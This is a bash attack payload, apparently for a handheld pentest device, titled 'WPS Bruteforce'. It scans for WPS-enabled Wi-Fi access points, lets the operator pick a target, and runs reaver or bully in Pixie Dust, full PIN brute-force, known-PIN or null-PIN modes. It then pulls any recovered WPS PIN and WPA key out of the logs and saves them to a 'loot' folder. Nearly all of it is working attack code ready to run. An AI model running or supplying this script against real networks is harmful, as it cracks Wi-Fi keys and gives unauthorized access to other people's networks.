#!/bin/bash
# Title: WPS Bruteforce
# Author: NullSec
# Description: WPS PIN brute force using reaver/bully with Pixie Dust support
# Category: nullsec/attack

LOOT_DIR="/mmc/nullsec/wpsbrute"
mkdir -p "$LOOT_DIR"

PROMPT "WPS BRUTEFORCE

Brute force WPS PINs
to recover WiFi keys.

Features:
- Reaver PIN attack
- Bully PIN attack
- Pixie Dust (offline)
- Custom PIN list
- Auto-target selection

WARNING: Active attack
May take hours for
full brute force.

Press OK to configure."

# Check for attack tools
HAS_REAVER=0
HAS_BULLY=0
command -v reaver >/dev/null 2>&1 && HAS_REAVER=1
command -v bully >/dev/null 2>&1 && HAS_BULLY=1

if [ $HAS_REAVER -eq 0 ] && [ $HAS_BULLY -eq 0 ]; then
    ERROR_DIALOG "No WPS tools found!

Install reaver or bully:
opkg install reaver
opkg install bully"
    exit 1
fi

# Find monitor interface
MONITOR_IF=""
for iface in wlan1mon wlan2mon mon0; do
    [ -d "/sys/class/net/$iface" ] && MONITOR_IF="$iface" && break
done

if [ -z "$MONITOR_IF" ]; then
    ERROR_DIALOG "No monitor interface!

Enable monitor mode:
airmon-ng start wlan1"
    exit 1
fi

PROMPT "ATTACK MODE:

1. Pixie Dust (fast)
2. PIN brute force
3. Known PINs list
4. Null PIN test

Tools: $([ $HAS_REAVER -eq 1 ] && echo "reaver ")$([ $HAS_BULLY -eq 1 ] && echo "bully")
Monitor: $MONITOR_IF

Select mode next."

ATTACK_MODE=$(NUMBER_PICKER "Mode (1-4):" 1)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) ATTACK_MODE=1 ;; esac

# Scan for WPS targets
SPINNER_START "Scanning for WPS APs..."

SCAN_FILE="/tmp/wps_scan_$$.txt"
if command -v wash >/dev/null 2>&1; then
    timeout 15 wash -i "$MONITOR_IF" -C 2>/dev/null | grep -v "^-" | grep -v "^BSSID" > "$SCAN_FILE"
elif [ $HAS_REAVER -eq 1 ]; then
    timeout 15 reaver -i "$MONITOR_IF" -vv --scan 2>/dev/null | grep "WPS" > "$SCAN_FILE"
fi

SPINNER_STOP

TARGET_COUNT=$(wc -l < "$SCAN_FILE" 2>/dev/null | tr -d ' ')
[ "$TARGET_COUNT" = "0" ] && { ERROR_DIALOG "No WPS-enabled APs found!"; rm -f "$SCAN_FILE"; exit 1; }

TARGET_LIST=$(head -8 "$SCAN_FILE" | awk '{print NR". "$1" "$6}')

PROMPT "WPS TARGETS: $TARGET_COUNT

$TARGET_LIST

Select target next.
Enter BSSID of target."

TARGET_BSSID=$(TEXT_PICKER "Target BSSID:" "$(head -1 "$SCAN_FILE" | awk '{print $1}')")
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) rm -f "$SCAN_FILE"; exit 0 ;; esac

TARGET_CHANNEL=$(grep "$TARGET_BSSID" "$SCAN_FILE" | awk '{print $2}')
TARGET_CHANNEL=${TARGET_CHANNEL:-6}

# Tool selection
if [ $HAS_REAVER -eq 1 ] && [ $HAS_BULLY -eq 1 ]; then
    PROMPT "SELECT TOOL:

1. Reaver
2. Bully

Select tool next."
    TOOL_PICK=$(NUMBER_PICKER "Tool (1-2):" 1)
    case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) TOOL_PICK=1 ;; esac
    [ "$TOOL_PICK" = "2" ] && USE_TOOL="bully" || USE_TOOL="reaver"
elif [ $HAS_REAVER -eq 1 ]; then
    USE_TOOL="reaver"
else
    USE_TOOL="bully"
fi

TIMEOUT_MIN=$(NUMBER_PICKER "Timeout (minutes):" 60)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) TIMEOUT_MIN=60 ;; esac

resp=$(CONFIRMATION_DIALOG "START WPS ATTACK?

Target: $TARGET_BSSID
Channel: $TARGET_CHANNEL
Tool: $USE_TOOL
Mode: $ATTACK_MODE
Timeout: ${TIMEOUT_MIN}m

This is an active attack.

Confirm?")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && { rm -f "$SCAN_FILE"; exit 0; }

TIMESTAMP=$(date +%Y%m%d_%H%M)
OUTPUT_FILE="$LOOT_DIR/wps_${TARGET_BSSID//:/}_$TIMESTAMP.log"

LOG "Starting WPS attack on $TARGET_BSSID..."
SPINNER_START "Attacking WPS PIN..."

TIMEOUT_SEC=$((TIMEOUT_MIN * 60))

case $USE_TOOL in
    reaver)
        case $ATTACK_MODE in
            1) # Pixie Dust
                timeout "$TIMEOUT_SEC" reaver -i "$MONITOR_IF" -b "$TARGET_BSSID" -c "$TARGET_CHANNEL" \
                    -K 1 -vv 2>&1 | tee "$OUTPUT_FILE" &
                ;;
            2) # Full brute force
                timeout "$TIMEOUT_SEC" reaver -i "$MONITOR_IF" -b "$TARGET_BSSID" -c "$TARGET_CHANNEL" \
                    -d 2 -vv 2>&1 | tee "$OUTPUT_FILE" &
                ;;
            3) # Known PINs
                timeout "$TIMEOUT_SEC" reaver -i "$MONITOR_IF" -b "$TARGET_BSSID" -c "$TARGET_CHANNEL" \
                    -p "" -d 1 -vv 2>&1 | tee "$OUTPUT_FILE" &
                ;;
            4) # Null PIN
                timeout "$TIMEOUT_SEC" reaver -i "$MONITOR_IF" -b "$TARGET_BSSID" -c "$TARGET_CHANNEL" \
                    -p "" -vv 2>&1 | tee "$OUTPUT_FILE" &
                ;;
        esac
        ;;
    bully)
        case $ATTACK_MODE in
            1) # Pixie Dust
                timeout "$TIMEOUT_SEC" bully "$MONITOR_IF" -b "$TARGET_BSSID" -c "$TARGET_CHANNEL" \
                    -d -v 3 2>&1 | tee "$OUTPUT_FILE" &
                ;;
            2) # Full brute force
                timeout "$TIMEOUT_SEC" bully "$MONITOR_IF" -b "$TARGET_BSSID" -c "$TARGET_CHANNEL" \
                    -v 3 2>&1 | tee "$OUTPUT_FILE" &
                ;;
            3|4)
                timeout "$TIMEOUT_SEC" bully "$MONITOR_IF" -b "$TARGET_BSSID" -c "$TARGET_CHANNEL" \
                    -v 3 2>&1 | tee "$OUTPUT_FILE" &
                ;;
        esac
        ;;
esac
ATTACK_PID=$!

SPINNER_STOP

PROMPT "WPS ATTACK RUNNING

Target: $TARGET_BSSID
Tool: $USE_TOOL
Timeout: ${TIMEOUT_MIN}m

Logging to:
$OUTPUT_FILE

Press OK to wait for
completion or timeout."

# Wait for attack
wait $ATTACK_PID 2>/dev/null

# Check results
WPS_PIN=$(grep -oE 'WPS PIN:.*' "$OUTPUT_FILE" 2>/dev/null | head -1)
WPA_KEY=$(grep -oE 'WPA PSK:.*' "$OUTPUT_FILE" 2>/dev/null | head -1)
ATTEMPTS=$(grep -c "Trying pin" "$OUTPUT_FILE" 2>/dev/null)

rm -f "$SCAN_FILE"

if [ -n "$WPA_KEY" ]; then
    PROMPT "WPS CRACKED!

$WPS_PIN
$WPA_KEY

Target: $TARGET_BSSID
Attempts: $ATTEMPTS

Saved: $OUTPUT_FILE

Press OK to exit."
elif [ -n "$WPS_PIN" ]; then
    PROMPT "PIN FOUND!

$WPS_PIN
(Key not recovered)

Target: $TARGET_BSSID
Attempts: $ATTEMPTS

Saved: $OUTPUT_FILE

Press OK to exit."
else
    PROMPT "ATTACK COMPLETE

No PIN found.
Attempts: $ATTEMPTS

Target may have WPS
lockout enabled or
rate limiting.

Log: $OUTPUT_FILE

Press OK to exit."
fi
